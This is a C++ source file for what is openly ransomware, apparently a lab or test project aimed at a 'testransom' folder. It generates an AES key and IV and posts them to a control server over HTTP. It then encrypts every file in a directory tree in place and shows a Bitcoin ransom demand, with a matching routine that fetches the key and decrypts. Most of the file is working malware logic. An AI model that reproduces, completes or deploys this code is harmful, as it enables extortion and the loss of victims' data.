#include <iostream>
#include "../include/ransom.h"
#include <filesystem>

using namespace CryptoPP;
namespace fs = std::filesystem;

void AESEncryptCBC(const std::string& inputFilePath, const std::string& outputFilePath,
    const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv) {
    std::string tempOutputFilePath = outputFilePath + ".tmp"; // Temporary file for encrypted content

    try {
        {
            CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryption;
            encryption.SetKeyWithIV(key, key.size(), iv);

            CryptoPP::FileSource fileSource(inputFilePath.c_str(), true,
                new CryptoPP::StreamTransformationFilter(encryption,
                    new CryptoPP::FileSink(tempOutputFilePath.c_str())
                )
            );
        }

        // Replace original file with encrypted file only if encryption was successful
        if (std::filesystem::exists(tempOutputFilePath)) {
            std::filesystem::rename(tempOutputFilePath, outputFilePath);
        }
    }
    catch (const CryptoPP::Exception& e) {
        std::cerr << "Encryption failed: " << e.what() << std::endl;
        // Cleanup: remove temporary file if exists
        if (std::filesystem::exists(tempOutputFilePath)) {
            std::filesystem::remove(tempOutputFilePath);
        }
    }
}



void AESDecryptCBC(const std::string& inputFilePath, const std::string& outputFilePath,
    const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv) {
    std::string tempOutputFilePath = outputFilePath + ".tmp"; // Temporary file for decrypted content

    try {
        {
            CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption decryption;
            decryption.SetKeyWithIV(key, key.size(), iv);

            CryptoPP::FileSource fileSource(inputFilePath.c_str(), true,
                new CryptoPP::StreamTransformationFilter(decryption,
                    new CryptoPP::FileSink(tempOutputFilePath.c_str()),
                    CryptoPP::StreamTransformationFilter::DEFAULT_PADDING
                )
            );
        }

        // Replace original file with decrypted file only if decryption was successful
        if (std::filesystem::exists(tempOutputFilePath)) {
            std::filesystem::rename(tempOutputFilePath, outputFilePath);
        }
    }
    catch (const CryptoPP::Exception& e) {
        std::cerr << "Decryption failed: " << e.what() << std::endl;
        // Cleanup: remove temporary file if exists
        if (std::filesystem::exists(tempOutputFilePath)) {
            std::filesystem::remove(tempOutputFilePath);
        }
    }
}


std::string getCommonFolderPath(int csidl) {
    char path[MAX_PATH];
    HRESULT result = SHGetFolderPath(NULL, csidl, NULL, SHGFP_TYPE_CURRENT, path);

    if (SUCCEEDED(result)) {
        return std::string(path);
    }
    else {
        return std::string("");
    }
}


void encryptAllFilesInDirectory(const std::string& directoryPath,
    const SecByteBlock& key, const SecByteBlock& iv) {
    for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
        if (entry.is_regular_file()) {
            std::string filePath = entry.path().string();

            AESEncryptCBC(filePath, filePath, key, iv); // Encrypt the file in place
            std::cout << "Encrypted: " << filePath << std::endl;
        }
    }
}

void decryptAllFilesInDirectory(const std::string& directoryPath,
    const SecByteBlock& key, const SecByteBlock& iv) {
    for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
        if (entry.is_regular_file()) {
            std::string filePath = entry.path().string();

            AESDecryptCBC(filePath, filePath, key, iv); // Encrypt the file in place
            std::cout << "Decrypted: " << filePath << std::endl;
        }
    }
}

std::pair<CryptoPP::SecByteBlock, CryptoPP::SecByteBlock> GenerateAESKeyAndIV() {
    AutoSeededRandomPool rnd;

    // Generate a random key
    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    rnd.GenerateBlock(key, key.size());

    // Generate a random IV
    SecByteBlock iv(AES::BLOCKSIZE);
    rnd.GenerateBlock(iv, iv.size());

    return { key, iv };  // Return key and IV as a pair
}

std::string SecByteBlockToHexString(const CryptoPP::SecByteBlock& block) {
    std::string hexString;
    HexEncoder encoder;

    encoder.Attach(new CryptoPP::StringSink(hexString));
    encoder.Put(block.BytePtr(), block.size());
    encoder.MessageEnd();

    return hexString;
}

void ShowDialog() {
    g_isDialogOpen = true;
    MessageBox(NULL,
        (LPCSTR)"YOUR COMPUTER HAS BEEN ENCRYPTED, PLEASE SEND US 0.0005 BTC TO THIS WALLET",
        (LPCSTR)"RANSOM RANSOM RANSOM",
        MB_OK | MB_ICONINFORMATION);
    g_isDialogOpen = false;
}

void DialogThread() {
    if (!g_isDialogOpen && g_isComputerEncrypted) { // Set this flag based on your condition

        // Run the dialog in a separate thread
        std::thread dialogThread(ShowDialog);
        dialogThread.detach();  // Detach the thread to run independently

        // Continue with other tasks...
        std::cout << "Main program continues execution." << std::endl;
    }
}

void runRansom() {
    std::string directoryPath = "C:\\Users\\anton\\testransom";
    while (true) {
        std::cout << "Checking..." << std::endl;
        while (!g_activateRansom.load() && !g_deactivateRansom.load()) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            DialogThread();
        }
        if (g_activateRansom.load()) {
            std::cout << "Encrypting..." << std::endl;
            auto [key, iv] = GenerateAESKeyAndIV();
            std::string keyHex = SecByteBlockToHexString(key);
            std::string ivHex = SecByteBlockToHexString(iv);
            std::cout << "Key in hex: " << keyHex << std::endl;
            std::cout << "IV in hex: " << ivHex << std::endl;
            // Encrypt all files in the directory
            SendKeyAndIVToServer(key, iv, "http://192.168.71.1:3000/save-key");
            encryptAllFilesInDirectory(directoryPath, key, iv);
            g_activateRansom.store(false);
            g_isComputerEncrypted.store(true);
        }
        if (g_deactivateRansom.load()) {
            CryptoPP::SecByteBlock key, iv;
            RetrieveKeyAndIV("http://192.168.71.1:3000/get-key", key, iv);
            std::string keyHex = SecByteBlockToHexString(key);
            std::string ivHex = SecByteBlockToHexString(iv);
            std::cout << "Key in hex: " << keyHex << std::endl;
            std::cout << "IV in hex: " << ivHex << std::endl;
            decryptAllFilesInDirectory(directoryPath, key, iv);
            g_deactivateRansom.store(false);
            g_isComputerEncrypted.store(false);
        }
    }
}


